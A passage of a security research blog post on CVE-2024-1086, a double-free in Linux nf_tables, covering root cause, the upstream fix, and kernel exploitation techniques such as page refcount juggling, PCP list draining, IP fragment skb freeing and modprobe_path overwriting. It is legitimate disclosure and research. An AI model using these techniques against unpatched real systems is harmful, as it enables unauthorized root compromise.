in the virtual address. This means that a virtual address is not an address, but pagetable indices with a prefixed canonical. This elegant approach allows for O(1) physical address retrieval, since array dereferences are O(1) and the bit shifting to recover for the index is O(1) as well. Unfortunately, pagetables would need to be traversed very often which would make even these array dereferences slow. Hence, the TLB is implemented.</p><p>In terms of practicality, the TLB needs to find the pagetables in physical memory to pagewalk them. The address for the root of the userland pagetable hierarchy (PGD) of <strong>the running process</strong> is stored in the privileged <code>CR3</code> register in the corresponding CPU core. &apos;Privileged&apos; means that the register can only be accessed from kernelspace, as userland accesses will lead to a permission error. When the kernel scheduler makes the CPU switch to another process context, the kernel will set the <code>CR3</code> register to <code>virt_to_phys(current-&gt;mm-&gt;pgd)</code>.</p><p>To learn more about how the MMU finds the location of the pagetable hierarchy when the CPU needs to do a TLB lookup with cache miss, check the <a href="https://en.wikipedia.org/wiki/Control_register" rel="noreferrer">Wikipedia page on control registers</a>. </p><h3 id="26-tlb-flushing">2.6. TLB Flushing</h3><p>TLB Flushing is the practice of, well, flushing the TLB. The translation lookaside buffer (TLB) caches translations between virtual addresses and physical addresses. This practice delivers a huge performance increase as the CPU doesn&apos;t have to traverse the pagetables anymore and can instead <em>lookaside</em> to the TLB. </p><p>When an virtual addresses&apos; pagetable hierarchy changes in kernelspace, it needs to be updated in the TLB as well. This is invoked manually from the kernel by doing function calls in the same functions where the pagetables are changed. These functions &quot;flush&quot; the TLB, which empties the translation cache (possibly only for a certain address range) of the TLB. Then, the next the virtual address is accessed, the TLB will save the translation to the TLB cache. </p><p>However, sometimes we change the pagetables (and their virtual addresses) in exploits at times where that&apos;s not expected. An example of this is using a UAF write bug to overwrite a PTE. At that time, the TLB flushing functions in the kernel are not called, since we are not using the functions to change the page tables, which do invoke said functions. Hence, we need to flush the TLB indirectly from userland. Otherwise, the TLB would contain outdated cache entries. In the techniques section of this blogpost I present my own method of doing this. </p><p>To learn more about the TLB, check the Wikipedia article: <a href="https://en.wikipedia.org/wiki/Translation_lookaside_buffer">&quot;Translation lookaside buffer - Wikipedia.&quot; </a></p><h3 id="27-dirty-pagetable">2.7. Dirty Pagetable</h3><p>Dirty Pagetable is a novel technique presented by N. Wu, which boils down to overwriting PTEs in order to perform an KSMA attack. Their research paper presents 2 scenarios to overwrite PTEs: a double-free bug and an UAF-write bug. Both scenarios are supplemented with a practical example. The original paper is definitely worth a read considering I learned a lot from it. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/02/dirtypagetable-3.svg" class="kg-image" alt loading="lazy" width="713" height="513"><figcaption><span style="white-space: pre-wrap;">Illustration 2.7.1: An high-level overview of the Dirty Pagetable technique.</span></figcaption></figure><p>However, there are a few critical topics out-of-scope in the original paper, which I try to include in this blogpost. An example of those topics is how pagetables work, TLB flushing, proof-of-concept code, the workings of physical KASLR, and the format of PTE values. Additionally, I present a variation on this technique (Dirty Pagedirectory) in this blogpost.</p><p>To learn more, check the original research paper by N. Wu: <a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">&quot;Dirty Pagetable: A Novel Exploitation Technique To Rule Linux Kernel.&quot;</a></p><h3 id="28-overwriting-modprobepath">2.8. Overwriting modprobe_path</h3><p>One of the more classical privilege escalation techniques is overwriting the <code>modprobe_path</code> variable in the kernel. The value of the variable is set to <code>CONFIG_MODPROBE_PATH</code> at compile-time, and is padded to <code>KMOD_PATH_LEN</code> bytes with nullbytes. Usually <code>CONFIG_MODPROBE_PATH</code> is set to &quot;/sbin/modprobe&quot; as that is the usual filepath for the modprobe binary. </p><p>The variable is used when a user is trying execute a binary with an unknown magic bytes header. For instance, the magic bytes of an ELF binary are <code>FE45 4C46</code> (a.k.a. &quot;.ELF&quot;). When executing the binary, the kernel will look for registered binary handlers which match said magic bytes. In the case of ELF, the ELF binfmt handler is selected. However when a registered binfmt is not recognized, modprobe will be invoked using the path stored in <code>modprobe_path</code> and it will <a href="https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1754">query for a kernel module</a> with the name <code>binfmt-%04x</code>, where <code>%04x</code> is the hex representation of the first 2 bytes in the file.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/02/modprobe_path-4.svg" class="kg-image" alt loading="lazy" width="923" height="748"><figcaption><span style="white-space: pre-wrap;">Illustration 2.8.1: Analysis of the modprobe_path privilege escalation technique.</span></figcaption></figure><p>To exploit this, we can overwrite the value of <code>modprobe_path</code> with a string of the path of a privilege escalation script (which gives /bin/sh root SUID for instance), and then invoke modprobe by trying to execute a file with an invalid format such as <code>ffff ffff</code>. The kernel will then run <code>/tmp/privesc_script.sh -q -- binfmt-ffff</code> as root, which allows us to run any code as root. This saves us the hassle of having to run kernel functions ourselves, and instead allows easy privesc by overwriting a string.</p><p>Somewhere along the line, the <code>CONFIG_STATIC_USERMODEHELPER_PATH</code> mitigation was introduced, which makes overwriting <code>modprobe_path</code> useless. The mitigation works by setting every executed binary&apos;s path to a busybox-like binary, which behaves differently based on the argv[0] filename passed. Hence, if we overwrite <code>modprobe_path</code>, only this argv[0] value would differ, which the busybox-like binary does not recognize and hence would not execute.</p><p>The exploit presented in this exploit works both with and without <code>CONFIG_STATIC_USERMODEHELPER_PATH</code>, because we can simply overwrite the read-only <code>&quot;/sbin/usermode-helper&quot;</code> string in kernel memory.</p><p>To learn more about the modprobe_path technique, check this useful page on Github by user Smallkirby: <a href="https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md">&quot;modprobe_path.md &#xB7; smallkirby/kernelpwn.&quot;</a></p><h3 id="29-kernelctf">2.9. KernelCTF</h3><p>KernelCTF is a program ran by Google with the intent of disclosing new exploitation techniques for (hardened) Linux kernels. It&apos;s also a great way to get an ethical bounty for any vulnerabilities you may have in the Linux kernel, as the bounties range from $21.337 anywhere up to $111.337 and even more, all depending on the scope of the vulnerability and if there are any novel techniques.</p><p>The major outlines are that there are 3 machine categories: LTS (long-term stable kernel hardened with existing mitigations), mitigation (kernel hardened with experimental mitigations on top of existing mitigations), and COS (container optimized OS). Each machine can be hacked once per version, and the researcher who hacked the machine first gets the reward. This means that if researcher A hacked LTS version 6.1.63, then researcher A and researcher B can still hack mitigation version 6.1.63. After the next version is released on the KernelCTF platform (typically after 2 weeks), both researcher A and researcher B can hack LTS version 6.1.65 again. However, the bug reported by researcher A for version 6.1.63 will most likely be fixed now, and would be treated like a duplicate anyways if it were to be exploited again.</p><p>In order to &quot;hack&quot; the KernelCTF machine, the researcher needs to read the <code>/flag</code> file in the root (jail host) namespace, which is only readable by the root user. As you may expect, this may require both a namespace sandbox (<code>nsjail</code>) escape as well as an privilege escalation to the root user. At the end of the day, this does not matter as long as the flag is captured.</p><p>To debug the environment, check the <code>local_runner.sh</code> script which the KernelCTF team provides. Note the <code>--root</code> flag, which allows you to run a root shell from outside of the jail.</p><p>To learn more about the KernelCTF program, check this page: <a href="https://google.github.io/security-research/kernelctf/rules.html">&quot;KernelCTF rules | security-research.&quot;</a></p><h2 id="3-the-bug">3. The bug</h2><h3 id="31-finding-the-bug">3.1. Finding the bug</h3><p>It all started when I wanted to implement firewall bypasses into my ORB rootkit  <a href="https://github.com/Notselwyn/netkit" rel="noreferrer">Netkit</a>. I wanted to rely on the kernel API (exported functions) for any actions, as it would have the same compatibility as regular kernel modules. Hopefully, this would mean that the rootkit kernel module could be used across architectures and kernel versions, without having to change the source code.</p><p>This led me into the rabbit hole called Netfilter. Before this research, I had no practical experience with Netfilter, so I had to do a lot of research on my own. Gladfully, there is plenty of documentation available from both the kernel developers and the infosec community. After reading myself into the subsystem, I read a bunch of source code from the top down related to nf_tables rules and expressions.</p><p>While reading nf_tables code - whose state machine is very interesting from a software development point of view - I noticed the <code>nf_hook_slow()</code> function. This function loops over all rules in a chain and stops evaluation (returns the function) immediately when <code>NF_DROP</code> is issued. </p><p>In the <code>NF_DROP</code> handling, it frees the packet and it allows a user to set the return value using <code>NF_GET_DROPERR()</code>. With this knowledge I made the function return <code>NF_ACCEPT</code> using the drop error when handling <code>NF_DROP</code>. A bunch of kernel panics and code path analyses later, I found a double-free primitive.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">// looping over existing rules when skb triggers chain
int nf_hook_slow(struct sk_buff *skb, struct nf_hook_state *state,
		 const struct nf_hook_entries *e, unsigned int s)
{
	unsigned int verdict;
	int ret;

	// loop over every rule
	for (; s &lt; e-&gt;num_hook_entries; s++) {
		// acquire rule&apos;s verdict
		verdict = nf_hook_entry_hookfn(&amp;e-&gt;hooks[s], skb, state);

		switch (verdict &amp; NF_VERDICT_MASK) {
		case NF_ACCEPT:
			break;  // go to next rule
		case NF_DROP:
			kfree_skb_reason(skb, SKB_DROP_REASON_NETFILTER_DROP);

			// check if the verdict contains a drop err
			ret = NF_DROP_GETERR(verdict);
			if (ret == 0)
				ret = -EPERM;

			// immediately return (do not evaluate other rules)
			return ret;

		// [snip] alternative verdict cases
		default:
			WARN_ON_ONCE(1);
			return 0;
		}
	}

	return 1;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 3.1.1: The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>nf_hook_slow()</span></code><span style="white-space: pre-wrap;"> kernel function written in C, which iterates over nftables rules.</span></p></figcaption></figure><h3 id="32-root-cause-analysis">3.2. Root cause analysis</h3><p>The root cause of the bug is quite simplistic in nature, as it is an input sanitization bug. The impact of this is a stable double-free primitive. </p><p>The important details of the dataflow analysis are that when creating a verdict <strong>object </strong>for a netfilter hook, the kernel allowed positive drop errors. This meant an attacking user could cause the scenario below, where <code>nf_hook_slow()</code> would free an skb object when <code>NF_DROP</code> is returned from a hook/rule, and then return <code>NF_ACCEPT</code> as if every hook/rule in the chain returned <code>NF_ACCEPT</code>. This causes the caller of <code>nf_hook_slow()</code> to misinterpret the situation, and continue parsing the packet and eventually double-free it.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">// userland API (netlink-based) handler for initializing the verdict 
static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,
			    struct nft_data_desc *desc, const struct nlattr *nla)
{
	u8 genmask = nft_genmask_next(ctx-&gt;net);
	struct nlattr *tb[NFTA_VERDICT_MAX + 1];
	struct nft_chain *chain;
	int err;

	// [snip] initialize memory

	// malicious user: data-&gt;verdict.code = 0xffff0000
	switch (data-&gt;verdict.code) {
	default:
		// data-&gt;verdict.code &amp; NF_VERDICT_MASK == 0x0 (NF_DROP)
		switch (data-&gt;verdict.code &amp; NF_VERDICT_MASK) {
		case NF_ACCEPT:
		case NF_DROP:
		case NF_QUEUE:
			break;  // happy-flow
		default:
			return -EINVAL;
		}
		fallthrough;
	case NFT_CONTINUE:
	case NFT_BREAK:
	case NFT_RETURN:
		break;  // happy-flow
	case NFT_JUMP:
	case NFT_GOTO:
		// [snip] handle cases
		break;
	}

	// successfully set the verdict value to 0xffff0000
	desc-&gt;len = sizeof(data-&gt;verdict);

	return 0;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 3.2.1: The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>nft_verdict_init()</span></code><span style="white-space: pre-wrap;"> kernel function written in C, which constructs an netfilter verdict object.</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">// looping over existing rules when skb triggers chain
int nf_hook_slow(struct sk_buff *skb, struct nf_hook_state *state,
         const struct nf_hook_entries *e, unsigned int s)
{
    unsigned int verdict;
    int ret;

    for (; s &lt; e-&gt;num_hook_entries; s++) {
        // malicious rule: verdict = 0xffff0000
        verdict = nf_hook_entry_hookfn(&amp;e-&gt;hooks[s], skb, state);  

        // 0xffff0000 &amp; NF_VERDICT_MASK == 0x0 (NF_DROP)
        switch (verdict &amp; NF_VERDICT_MASK) {  
        case NF_ACCEPT:
            break;
        case NF_DROP:
            // first free of double-free
            kfree_skb_reason(skb,
                     SKB_DROP_REASON_NETFILTER_DROP);  
            
            // NF_DROP_GETERR(0xffff0000) == 1 (NF_ACCEPT)
            ret = NF_DROP_GETERR(verdict);  
            if (ret == 0)
                ret = -EPERM;
            
            // return NF_ACCEPT (continue packet handling)
            return ret;  

        // [snip] alternative verdict cases
        default:
            WARN_ON_ONCE(1);
            return 0;
        }
    }

    return 1;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 3.2.2: The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>nf_hook_slow()</span></code><span style="white-space: pre-wrap;"> kernel function written in C, which iterates over nftables rules.</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">static inline int NF_HOOK(uint8_t pf, unsigned int hook, struct net *net, struct sock *sk, 
	struct sk_buff *skb, struct net_device *in, struct net_device *out, 
	int (*okfn)(struct net *, struct sock *, struct sk_buff *))
{
	// results in nf_hook_slow() call
	int ret = nf_hook(pf, hook, net, sk, skb, in, out, okfn);

	// if skb passes rules, handle skb, and double-free it
	if (ret == NF_ACCEPT)
		ret = okfn(net, sk, skb);

	return ret;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 3.2.3: The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>NF_HOOK()</span></code><span style="white-space: pre-wrap;"> kernel function written in C, which calls a callback function on success.</span></p></figcaption></figure><p><a href="https://lore.kernel.org/all/20240120215012.129529-1-fw@strlen.de" rel="noreferrer"></a></p><h3 id="33-bug-impact-exploitation">3.3. Bug impact &amp; exploitation</h3><p>As said in the subsection above, this bug leaves us with a very powerful double-free primitive when the correct code paths are hit. The double-free impacts both <code>struct sk_buff</code> objects in the <code>skbuff_head_cache</code> slab cache, as well as a dynamically-sized <code>sk_buff-&gt;head</code> object ranging from <code>kmalloc-256</code> up to order 4 pages directly from the buddy-allocator (65536 bytes) with ipv4 packets (perhaps even more with ipv6 jumbo packets?).</p><p>The <code>sk_buff-&gt;head</code> object is allocated through a kmalloc-like interface (<code>kmalloc_reserve()</code>) in <code>__alloc_skb()</code>. This allows us to allocate objects of a dynamic size. Hence, we can allocate slab objects from size 256 to full-on pages of 65536 bytes from the buddy allocator. An functional overview of this can be found in the page allocaction subsection of the background info section.</p><p>The size of the sk_buff-&gt;head object is directly influenced by the size of the network packet, as this object contains the packet content. Hence, if we send a packet with e.g. 40KiB data, the kernel would allocate an order 4 page directly from the buddy-allocator.</p><p>When you try to reproduce the bug yourselves, the kernel may panic, even when all mitigations are disabled. This is because certain fields of the skb - such as pointers - get corrupted when the skb is freed. As such, we should try to avoid usage of these fields. Fortunately, I found a way to bypass all usage which could lead to a panic or usual errors and get a highly reliable double-free primitive. I&apos;m highlighting this in the respective subsection within the proof-of-concept section.</p><h3 id="34-bug-fixes">3.4. Bug fixes</h3><p>When I reported the bug to the kernel developers, I proposed my own bug fix which regretfully had to introduce a specific breaking change in the middle of the netfilter stack. </p><p>Thankfully, one of the maintainers of the subsystem came up with their own elegant fix. Their fix sanitizes verdicts from userland input in the netfilter API itself, before the malicious verdict is even added. The specific fix makes the kernel disallow drop errors entirely for userland input. The maintainer mentions however that if this behaviour is needed in the future, only drop errors with <code>n &lt;= 0</code> should be allowed to prevent bugs like these. This is because positive drop errors like <code>1</code> will overlap as <code>NF_ACCEPT</code>. </p><p>Additionally, the vulnerability was assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1086">CVE-2024-1086</a> (this was before the Linux kernel became an CNA and ruined the meaning of CVEs).</p><figure class="kg-card kg-code-card"><pre><code>A use-after-free vulnerability in the Linux kernel&apos;s netfilter: nf_tables component can be exploited to achieve local privilege escalation.

The nft_verdict_init() function allows positive values as drop error within the hook verdict, and hence the nf_hook_slow() function can cause a double free vulnerability when NF_DROP is issued with a drop error which resembles NF_ACCEPT.

We recommend upgrading past commit f342de4e2f33e0e39165d8639387aa6c19dff660.</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 3.4.1: The description of CVE-2024-1086.</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-diff">--- a/net/netfilter/nf_tables_api.c
+++ b/net/netfilter/nf_tables_api.c
@@ -10988,16 +10988,10 @@ static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,
 	data-&gt;verdict.code = ntohl(nla_get_be32(tb[NFTA_VERDICT_CODE]));
 
 	switch (data-&gt;verdict.code) {
-	default:
-		switch (data-&gt;verdict.code &amp; NF_VERDICT_MASK) {
-		case NF_ACCEPT:
-		case NF_DROP:
-		case NF_QUEUE:
-			break;
-		default:
-			return -EINVAL;
-		}
-		fallthrough;
+	case NF_ACCEPT:
+	case NF_DROP:
+	case NF_QUEUE:
+		break;
 	case NFT_CONTINUE:
 	case NFT_BREAK:
 	case NFT_RETURN:
@@ -11032,6 +11026,8 @@ static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,
 
 		data-&gt;verdict.chain = chain;
 		break;
+	default:
+		return -EINVAL;
 	}
 
 	desc-&gt;len = sizeof(data-&gt;verdict);
-- </code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 3.4.2: C code diff of the </span><code spellcheck="false" style="white-space: pre-wrap;"><span>nft_verdict_init()</span></code><span style="white-space: pre-wrap;"> kernel function being patched against the bug.</span></p></figcaption></figure><p>You can learn more about their fix on the kernel lore website: <a href="https://lore.kernel.org/all/20240120215012.129529-1-fw@strlen.de" rel="noreferrer">&quot;[PATCH nf] netfilter: nf_tables: reject QUEUE/DROP verdict parameters.&quot;</a></p><h2 id="4-techniques">4. Techniques</h2><h3 id="41-page-refcount-juggling">4.1. Page refcount juggling</h3><p>The first technique required for the exploit is juggling page refcounts. When we attempt to double-free a page in the kernel using the dedicated API functions, the kernel will check the refcount of the page:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void __free_pages(struct page *page, unsigned int order)
{
	/* get PageHead before we drop reference */
	int head = PageHead(page);

	if (put_page_testzero(page))
		free_the_page(page, order);
	else if (!head)
		while (order-- &gt; 0)
			free_the_page(page + (1 &lt;&lt; order), order);
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 4.1.1: C code of the </span><code spellcheck="false" style="white-space: pre-wrap;"><span>__free_pages()</span></code><span style="white-space: pre-wrap;"> kernel function with original comments.</span></p></figcaption></figure><p>The refcount is usually 1 before we free the page (unless it is shared or something, then it is higher). If the pages&apos; refcount is below 0 after it is decremented, it will refuse to free the page (<code>put_page_testzero()</code> will return false). This means that we shouldn&apos;t be able to double-free pages... unless?</p><p>The active readers will notice that several child-pages will then be freed until <code>order-- == 0</code>. However, after the first page free the page order is set to 0. Hence during the 2nd free where said code gets ran, no pages will be freed since <code>order-- == -1</code>. The fact that the page order gets set to 0 after a page free will be abused to convert the double-free pages to order 0 in the &quot;Setting page order to 0&quot; technique section.</p><p>In the context of a double-free: when we free the page for the 1st time, the refcount will be decremented to 0 and hence the page will be freed as the code above allows it to be. However, when we try free the page for 2nd time, the refcount will be decremented to -1 and it will not be freed since the refcount != 0 and may even raise a BUG() if <code>CONFIG_DEBUG_VM</code> is enabled.</p><p>So, how do we double-free pages then? Simple: allocate the page again before the 2nd free, as the free will look like a non-double-free free considering there is an actual object in the page. This can be any object with the same size, such as a slab or a pagetable, which is what I&apos;m utilizing with the exploit.</p><p>In the most simplistic form, the implementation of this technique will look like this:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void kref_juggling(void)
{
    struct page *skb1, *pmd, *pud;

    skb1 = alloc_page(GFP_KERNEL);  // refcount 0 -&gt; 1
    __free_page(skb1);  // refcount 1 -&gt; 0
    pmd = alloc_page(GFP_KERNEL);  // refcount 0 -&gt; 1
    __free_page(skb1);  // refcount 1 -&gt; 0
    pud = alloc_page(GFP_KERNEL);  // refcount 0 -&gt; 1

    pr_err(&quot;[*] skb1: %px (phys: %016llx), pmd: %px (phys: %016llx), pud: %px (phys: %016llx)\n&quot;, skb1, page_to_phys(skb1), pmd, page_to_phys(pmd), pud, page_to_phys(pud));
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 4.1.2: C code of a custom kernel module, containing comments describing page refcounts.</span></p></figcaption></figure><p>In terms of cleaning this up post-exploitation, it&apos;s incredibly easy: just free both objects at will, as the kernel will refuse to double-free the page because of the refcount. :-)</p><h3 id="42-page-freelist-entry-order-4-to-order-0">4.2. Page freelist entry order 4 to order 0</h3><p>When an allocation happens through <code>__do_kmalloc_node()</code> (such as skb&apos;s), the size of the allocated object is checked against <code>KMALLOC_MAX_CACHE_SIZE</code> (the maximum slab-allocator size). If the object is larger than that, one of the page allocators will be used instead of the slab-allocator. This is useful when we want to deterministically free pages like the skb data and allocate pages like PTE pages using the same algorithms and freelists. However, the value of <code>KMALLOC_MAX_CACHE_SIZE</code> is equivalent to <code>PAGE_SIZE * 2</code>, which means that kmalloc will be using the page allocators for allocations above order 1 (2 pages, or 8096 bytes).</p><p>Unfortunately enough, some objects we may want to target are exclusively allocated by page allocators whilst still falling within the size of the slab-allocator. For example, a developer may use <code>alloc_page()</code> instead of <code>kmalloc(4096)</code>, because this saves overhead. An example of this is a PTE page (or any other pagetable page for that sake), which uses page allocations of order 0 (1 page, or 4096 bytes). </p><p>If we would double-free an object of 4096 bytes (an order==0 page) handled by the slab-allocator, it would end up in the slabcaches, not in the pagecache. Hence, in order to double-alloc pages in the order==0 freelist, we need to convert the order 4 (16 page) freelist entries from our double-free to the order 0 (1 page) freelist entries.</p><p>Luckily, I found 2 methods to allocate order==0 pages with order==4 page freelist entries. </p><h4 id="421-draining-the-pcp-list">4.2.1. Draining the PCP list</h4><p>This method takes advantage of the fact that the PCP-allocator is basically a set of per-CPU freelists for the buddy-allocator. When one of those PCP freelists are empty, it will refill pages from the buddy-allocator. </p><blockquote>For a functional overview of the page allocation process (including if statements, and the slab-allocator and buddy-allocator), check the page allocation subsection in the background section.</blockquote><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/03/pcp_refill-3.svg" class="kg-image" alt loading="lazy" width="1193" height="626"><figcaption><span style="white-space: pre-wrap;">Illustration 4.2.1.1: Timeline of memory operations to set a page order to 0.</span></figcaption></figure><p>The refill happens in bulks of <code>count = N/order</code> page objects. Hence, the function <code>rmqueue_bulk()</code> (which is used for the refill) allocates <code>count</code> pages with order <code>order</code> from the buddy-allocator. When allocating a page from the buddy-allocator, it will traverse the buddy page freelist, and if the buddy freelist entries&apos; order &gt;= <code>order</code>, then it will return this page for the refill. If the buddy freelist entries&apos; order &gt; <code>order</code>, then the buddy-allocator will internally divide the page.</p><p>Notice that our exploit double-free&apos;s order==4 pages, and needs to fill those with order==0 PCP pages. When we free it, the order==4 page is added to the buddy-freelist. For our exploit we want to place an order==0 page into these 16 pages, because the order==4 page will be double-freed. The allocation for order==0 pages happens with the PCP allocator, which has per-order freelists. However, the PCP-refill mechanism will take any buddy-page if it fits. Hence, we can allocate 16 PTE pages into the double-freed order==4 page. </p><p>As said, in order to trigger this mechanism we must first drain the PCP freelist for the target CPU by spraying page allocations. In my exploit I do this by spraying PTE pages, and this is directly related to the Dirty Pagedirectory technique. Because we cannot tell if the PCP freelist was drained, we need to assume one of the sprayed objects is allocated in the double-free object. Hence, I spray PTE objects so an PTE object takes the spot of one of the double-free&apos;d buddy pages. If I wanted to allocate an PMD object, I would spray PMD objects, et cetera.</p><p> The amount of objects in the freelists differs per system and per resource usage. For the exploit I used 16000 PTE objects which is - in all cases I encountered - enough to empty the freelist.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static int rmqueue_bulk(struct zone *zone, unsigned int order,
			unsigned long count, struct list_head *list,
			int migratetype, unsigned int alloc_flags)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&amp;zone-&gt;lock, flags);
	for (i = 0; i &lt; count; ++i) {
		struct page *page = __rmqueue(zone, order, migratetype, alloc_flags);
		if (unlikely(page == NULL))
			break;

		list_add_tail(&amp;page-&gt;pcp_list, list);
		// [snip] set stats
	}

    // [snip] set stats
	spin_unlock_irqrestore(&amp;zone-&gt;lock, flags);

	return i;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 4.2.1.2: C code of the </span><code spellcheck="false" style="white-space: pre-wrap;"><span>rmqueue_bulk()</span></code><span style="white-space: pre-wrap;"> kernel function, which refills the PCP freelist.</span></p></figcaption></figure><h4 id="422-race-condition-obsolete">4.2.2. Race condition (obsolete)</h4><p><strong>&gt;&gt; This technique is obsolete, but was used for kernelctf exploit &lt;&lt;</strong></p><p>The first free() append the page to the correct freelist, and will set the page order to 0. However when doing a double-free (2nd free), the page will be added to the freelist for order 0 since that&apos;s what the page order is for that page.  This way, we can add order==4 pages to the order==0 freelists with a double-free primitive.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/02/converting_page_order-1.svg" class="kg-image" alt loading="lazy" width="931" height="628"><figcaption><span style="white-space: pre-wrap;">Illustration 4.2.2.1: Timeline of memory operations to set a page order to 0.</span></figcaption></figure><p>Less luckily, this technique is a race condition. When a page is freed for the 2nd time without a intercepting alloc (<code>free; free; alloc; alloc</code>), the refcount of the page will drop below 0 and will not allow a double-free, so we need to do page reference juggling (<code>free; alloc; free; alloc</code>). However, then the order will not be 0 at the 2nd free, because the alloc will set the order to the original amount (i.e. order 4). Now, converting the page to order 0 seems impossible since it should be either no free at all (refcount -1), or the page being the original order (proper scenario). Enter: the race condition.</p><p>When a page is freed its order is passed by value. This means that if the double-freed page gets allocated during the 2nd free, it will be allocated to the freelist of order 0 and will have the refcount incremented, so it will not hit -1 and be 0 as it should be. As you can imagine, the race window is quite small since it consists of a few function calls. However, the <code>free_large_kmalloc()</code> function prints a kernel WARN() to dmesg if the order is 0, which it is because of the double-free. Usually, this only provides 1ms for the window, but for virtualized systems like QEMU VMs with serial terminals, the window is 50ms-300ms, which is more than enough to hit. </p><p>Now we have successfully attached the page the order 0 freelist, which means that we can now overwrite the page with any order-0 page allocation. We can also convert the 1st page reference (acquired with the 1st free) by freeing that object and reallocating it as a new object since the page order will persist. If we are using page refcount juggling, we want to free the object which took the first freed reference.</p><h3 id="43-freeing-skb-instantly-without-udptcp-stacks">4.3. Freeing skb instantly without UDP/TCP stacks</h3><p>When we are avoiding freelist corruption checks, we may want to free a certain skb directly at will at an arbitrary time, so our exploit can work in a very fast, synchronous manner with less chance of corruption. </p><blockquote>Note that this behaviour is typically done with local UDP packets, but the skb gets corrupted after the first free in the double-free, which means I cannot use the TCP or UDP stacks for this, which utilized corrupted fields.</blockquote><blockquote><strong>OBSOLETE (KERNELCTF EXPLOIT)</strong>: Alternatively, we may want to free a certain skb on a specific CPU to bypass double-free detection, since the sk_buff freelist is per-CPU. This means that if we double-free an object across 2 CPUs directly after each other, the double-free will not be detected. We cannot &quot;shoot the previous skb to the moon&quot; (a.k.a. allocating a never expiring skb) to prevent double-free detection since this would alter the skb head pages by either changing the pointer, or by allocating the same pointer from the freelist preventing an double-free anyways. </blockquote><p>Fortunately, IP packet fragmentation and its fragment queues exist. When an IP packet is waiting for all its fragments to be received, the fragments are placed into an IP frag queue (red-black tree). When the received fragments have the expected length of the full IP packet, the packet is reassembled on the CPU the last fragment came from. Please note that this IP frag queue has a timeout of <code>ipfrag_time</code> seconds, which will free all skb&apos;s. Changing this timeout is mentioned in the subsection hereafter.</p><p>If we wanted to switch the freelist of skb freelist entry <code>skb1</code> from CPU 0 to CPU 1, we would allocate it as an IP fragment to a new IP frag queue on CPU 0. Then, we send <code>skb2</code> - the final IP fragment for the queue on CPU 1. This causes <code>skb1</code> to be freed on CPU 1.</p><p>This same behaviour can be used to free skb&apos;s at will, without using UDP/TCP code. This is benificient for the exploit, since the double-free packet is corrupted when it is freed for the first time. If we would use UDP code, the kernel would panic due to all sorts of nasty behaviour.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/02/switching_skb_cpu-1.svg" class="kg-image" alt loading="lazy" width="941" height="573"><figcaption><span style="white-space: pre-wrap;">Illustration 4.3.1: Timeline of activities to switch an skb&apos;s per-CPU freelist.</span></figcaption></figure><p>Unfortunately, the IP fragment queue&apos;s final size is determined by <code>skb-&gt;len</code>, which is fully randomized after the free due to overlaps with the slabcache&apos;s <code>s-&gt;random</code>. For details, check the next subsection. This means that it is practically impossible to complete the IP frag queue consistently because it will use a random expected length. </p><p>Hence, I came up with a different strategy: instead of completing the IP frag queue we make it raise an error using invalid input. This will cause all skb&apos;s in the IP frag queue to be freed instantaneously on the CPU of the erroring skb, regardless of <code>skb-&gt;len</code>. </p><blockquote>When implementing this technique yourself, note that double-free detection (<code>CONFIG_FREELIST_HARDENED</code>) will be triggered if you do not append &quot;innocent&quot; skb objects between free <code>skb1</code> and alloc <code>skb2</code>. For demonstrative purposes these have been left out in the diagram, but are included in the PoC sections.</blockquote><h4 id="431-modifying-skb-max-lifetime">4.3.1. Modifying skb max lifetime</h4><p>For our exploit we may want skb&apos;s to live shorter or longer, depending on the usecase. Luckily, the kernel provides an userland interface to configure IP fragmentation queue timeout times over at <code>/proc/sys/net/ipv4/ipfrag_time</code>. This is specific per network namespace, and can hence be set as unprivileged user in their own networking namespace.</p><p>When we use IP fragments to reassemble an split IP packet, the kernel will wait <code>ipfrag_time</code> seconds before issuing a timeout. If we set <code>ipfrag_time</code> to 999999 seconds, the kernel will let the fragment skb live for 999999 seconds. Invertedly, we can also set it to 1 second if we want to swiftly allocate and deallocate an skb on a random CPU. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void set_ipfrag_time(unsigned int seconds)
{
	int fd;
	
	fd = open(&quot;/proc/sys/net/ipv4/ipfrag_time&quot;, O_WRONLY);
	if (fd &lt; 0) {
		perror(&quot;open$ipfrag_time&quot;);
		exit(1);
	}

	dprintf(fd, &quot;%u\n&quot;, seconds);
	close(fd);
